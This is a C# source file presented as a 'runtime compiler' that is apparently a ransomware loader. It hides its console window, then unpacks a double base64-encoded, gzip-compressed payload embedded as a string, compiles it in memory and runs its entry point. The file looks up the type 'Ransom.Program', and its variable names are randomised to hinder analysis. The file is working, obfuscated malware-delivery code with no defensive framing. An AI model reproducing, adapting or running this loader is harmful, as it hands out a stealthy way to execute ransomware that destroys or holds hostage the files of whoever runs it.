using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace runtimecompiler
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public static void CopyTo(Stream src, Stream dest)
        {
            byte[] bytes = new byte[4096];

            int cnt;

            while ((cnt = src.Read(bytes, 0, bytes.Length)) != 0)
            {
                dest.Write(bytes, 0, cnt);
            }
        }
        public static string funcRQSFO(byte[] bytes)
        {
            using (var msi = new MemoryStream(bytes))
            using (var mso = new MemoryStream())
            {
                using (var gs = new GZipStream(msi, CompressionMode.Decompress))
                {
                    //gs.CopyTo(mso);
                    CopyTo(gs, mso);
                }

                return Encoding.UTF8.GetString(mso.ToArray());
            }
        }


        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, 0);

            string strJID2T = @"H4sIAAAAAAAEAO1YXXOqSBD9SYtwqayPAoKDSi4DDDBvfBhABrViUPHXbw8mBo3E5N7d2n3YhynLFnq6+3SfOePDQ/1HGlibuEoyT2LH1CAvj3them2bleznTTuzWCiRJgqwPCutZhEoQiymTRgo64W7tdQVOUa+vEK6JScSZrEjezTIBe5Lszd16A9YIil5KHqZV+l1Ig5fwP6g2esMqaMsFA95Is0zb2LuqGTmsS1MuR1NwHcxap/hK5mQIjbYEhnWLl5ZAppYQlKxmjbKMw3K7KczKpwxmbvjYeAOzDlWEd/jyoe5SStdoI4CuelC5M8zArbEODA8Jq4tmXIywTtPJE1asSUlShNLdEMN0iADs0R4zX/QsWtCFldEQjqGGilb6mHdOz9nsWRFN6FI7KQaipEPPopsw2vzFhNSlT3kIYYBZjwn+NyEjWJhjWjJiu1TY+jSwIR3LcZrBHGVNEBZZOjHaDwYW+RGLNzu3Y/hDYNTvRWIn+ap4WWAI3xCrSd0F/l2hg3WUN8SYqgP1CZPKmuNPVmbvmNQRgHaXPq7xK+TbwV+WOhba6TmxxTqz/uNFsomLpRxFMBvEt4lq7LGIhFwxbY0mK8pxDB1yj6fDxd7X68JbhZ2t+bffP/0jBH5BzZjKZ8FZvuHrb1iAo/N472kyhMaYCMF++l7Xk2dfYZ9edniqOav7/PcsRIbB3UBfpImtwHz9axMWTqmA7C336dGuHl7PxYxr1FtE0tzvFNd3vaORCJDXa566vayxSGfvy115ABwE6h3AL/eGrEX3S2tFKkomzZKN55NbJBHPsNtPG4fpqf15ChLeHcZqaM1DvIlhf6L/GGNDHKc/n79tViUj7EINSzpLqnICvp5EFcY7IddUoyGaNxyww5ifrXJDvXt7/l+xdc1oK+drPAFEtoDIUPF6BnpCsxF9t6XnpzHvremRfnMazdzf5yeg3zb+ulYTgxvDfj8U/mNw8B8tiWWx8vPsWlXy53QSyvCPu8XZdgX71MfjkYbM/B8lnV5AUEd0Rhv4LclcFmzcNo5eZ/zivEZaPmjt0d6ueS0evnJsPvnYiJc+LzM6yYni7HIyotcCJyNgbmMxli3mw6Xca669NeLP62GELvezgzwbtOepUaYRf6Pi7w683icGhBDUW76fC4+x1YAbv20nnfe/zUeNMh/gAc/m3PA8P6c3/PfOzev8wd+23NPXxhwLk8gH/FHBvH3YvmV/m/XmRu8Grc9lYIuIDXlduhVrg3O/O+dbBwDqn3PN5FAQxlkDn3KpqoZY5JrAWgvpG6zLv4cY7fSX6jD8R/9W/yoLXy9/srZGEJtQPPUqe/d0RJCnwbpxf72jNs9M/7OL5H/27Pe0VPMhRiaUMzH2AM9pfbX/IoLh3d1omHK0BNx4Ch6XJ105/TddoQ+hH29bec5rtnv68UezT0rX9jCAbyNPE/EnGvljraVAfvBPoXZdrhGVvN2r1s9AL6OZ83/rq1r1x+W1Gn7Ce4GOUvKwY5C79uCqd3yA3gJaWDW/fFaHH/QW6QOX/fjGnzGcBP68pH3R+wBt1f61q4Ou1DcrmFOB3COsZk62s/Ucw1r14CZloAXr7TYF86vgvOsDxzX4eKzjZ74lVEds8XE/h8rD7OvYvWhdtoI6gdYixCbj9v78Kw8sLhKgR+v5o7zSXaB3flumlbDDVUVK/RZfdZUg5cUGXpDpfl9TN512Jrz/0eusQbJymSgCbv3rg+99cvnS4lBi730cnDvfaSYL1FzewUCebQHJvV0bLpl+tT3HKzidh639Bv4bPJT3tnfEyceDx8xGfJ7leMTxXM8efL9WH+l5pYc+j9ucHu/9umPy3rCY6J5jNlkzB7x4M/efFGDPv6ncOcMep2FT/O+1Buof38B/3RLchlvf72XqLh1/nVrZLKE60uobSyh2zPR+c8rmrR6ttWnxMg5h5QzZm2pT/ZTDe3n2uj6f5/zucq5m6+/AL9QvCysEwAA";
            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters();

            parameters.ReferencedAssemblies.Add("System.IO.dll");
            parameters.ReferencedAssemblies.Add("System.Security.dll");

            parameters.GenerateInMemory = true;
            parameters.GenerateExecutable = true;
            parameters.CompilerOptions = "/optimize";

            byte[] byteArrSMIYT = Convert.FromBase64String(funcRQSFO(Convert.FromBase64String(strJID2T)));

            CompilerResults cr2ABTS = provider.CompileAssemblyFromSource(parameters, Encoding.UTF8.GetString(byteArrSMIYT));

            if(cr2ABTS.Errors.HasErrors)
            {
                StringBuilder sb = new StringBuilder();

                foreach (CompilerError error in cr2ABTS.Errors)
                {
                    sb.AppendLine(String.Format("Error ({0}): {1}", error.ErrorNumber, error.ErrorText));
                }

                throw new InvalidOperationException(sb.ToString());
            }

            Assembly assembly = cr2ABTS.CompiledAssembly;
            Type program = assembly.GetType("Ransom.Program");
            MethodInfo main = program.GetMethod("Main");
            string[] B = { null };
            object[] I = { B, };
            assembly.EntryPoint.Invoke(null, I);
        }
    }
}
